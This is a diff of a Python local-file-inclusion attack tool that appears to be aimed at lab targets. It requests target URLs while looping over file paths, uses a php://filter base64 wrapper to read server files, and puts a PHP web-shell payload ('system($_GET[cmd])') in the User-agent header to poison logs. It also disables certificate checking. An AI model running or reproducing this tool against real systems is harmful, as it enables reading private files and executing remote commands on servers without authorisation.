@@ -9,6 +9,7 @@ import urllib
 import re
 import os
 import subprocess
+
 ssl._create_default_https_context = ssl._create_unverified_context  
 from Package.one_read import Read_File
 path = ('file://'+os.getcwd()+'/FileStore/').replace('\\n','')    
@@ -129,7 +130,7 @@ class Aggressiv :
                 command_dir = readline.readlines()
                 for LINE in command_dir :
                     LINE.replace('\n','')
-                   # self.LFi = ''
+                    self.LFi = ''
                     if self.args.base64:
                         if 'sess_' not in LINE :
                             phpfillter = 'php://filter/read=convert.base64-encode/resource='
@@ -145,19 +146,20 @@ class Aggressiv :
                     request = mechanize.Browser()
                     request.set_handle_robots(False)
                     request.set_handle_redirect(True)
-                    request.set_handle_refresh(True, max_time=1)              
+                    request.set_handle_refresh(True, max_time=0)              
                     request.addheaders = [('User-agent', 'Mozilla/5.0<?php echo system($_GET["cmd"]); ?>(X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                  Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                  ('Cookie',str(self.Cookie).replace('\n','')),
                                  ('username',f'{self.args.user}'),
                                  ('password',f'{self.args.password}')]
-                    try:             
-                       first_req = request.open(self.args.Vulnurl,timeout=5).read()                                                      
-                       self.Get_Oregnal_URL = request.open(self.url).read()
+                    try:   
+                        first_req = request.open(self.args.Vulnurl).read()   
+                        self.Get_Oregnal_URL = request.open(self.url,timeout=3).read()
                     except Exception  as e :
                          print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                          print("[*] Error : ",e )
                          print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
+                         print("[*] Try To Use PHP-Filter as -B Option ")
                          print("[*] Follow url Format ")
                          print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                          print("[*] Example : http://10.10.10.193:4000/page=index.php")
